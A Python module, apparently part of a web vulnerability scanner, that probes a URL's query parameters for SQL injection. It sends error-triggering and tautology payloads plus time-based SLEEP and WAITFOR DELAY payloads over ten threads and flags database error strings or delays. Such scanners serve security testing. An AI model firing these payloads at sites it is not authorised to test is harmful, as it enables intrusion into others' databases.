from ..core.client import fetch
from ..core.utils import extract_params
from urllib.parse import urlparse, urlencode, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

ERRORS = ["sql", "mysql", "syntax error", "unclosed quotation", "odbc", "oracle",
          "postgresql", "pg_", "driver", "warning: mysql", "supplied argument is not a valid mysql",
          "you have an error in your sql", "invalid query", "division by zero"]

TIMING = "' OR SLEEP(5)--"
TIMING_MS = "' WAITFOR DELAY '0:0:5'--"


def scan(url):
    findings = []
    params = extract_params(url)
    if not params:
        params = ["id", "q", "search", "page", "user", "cat", "pid"]

    base = url.split("?")[0] if "?" in url else url

    def _test_error(param, payload):
        if "?" in url:
            parsed = urlparse(url)
            from urllib.parse import parse_qs
            qs = parse_qs(parsed.query, keep_blank_values=True)
            qs[param] = [payload]
            u = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(qs, doseq=True)}"
        else:
            u = f"{base}?{param}={quote(payload)}"
        s, h, b = fetch(u, timeout=8)
        if s:
            for e in ERRORS:
                if e in b.lower():
                    return {"name": f"SQLi ({param})", "severity": "CRITICAL", "url": u, "payload": payload, "evidence": e}
        return None

    def _test_time(param, payload):
        if "?" in url:
            parsed = urlparse(url)
            from urllib.parse import parse_qs
            qs = parse_qs(parsed.query, keep_blank_values=True)
            qs[param] = [payload]
            u = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(qs, doseq=True)}"
        else:
            u = f"{base}?{param}={quote(payload)}"
        t0 = time.time()
        s, h, b = fetch(u, timeout=12)
        elapsed = time.time() - t0
        if elapsed >= 4:
            return {"name": f"SQLi Time ({param})", "severity": "CRITICAL", "url": u, "payload": payload, "evidence": f"{elapsed:.1f}s delay"}
        return None

    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = []
        for p in params:
            for payload in ["'", "\"", "')", "' OR '1'='1", "' OR 1=1--", "1' OR '1'='1", "1' OR 1=1--", "' OR 1=1#", "1' OR 1=1#"]:
                futures.append(ex.submit(_test_error, p, payload))
            futures.append(ex.submit(_test_time, p, TIMING))
            futures.append(ex.submit(_test_time, p, TIMING_MS))
        for f in as_completed(futures):
            try:
                r = f.result()
                if r:
                    findings.append(r)
            except Exception:
                pass

    return findings
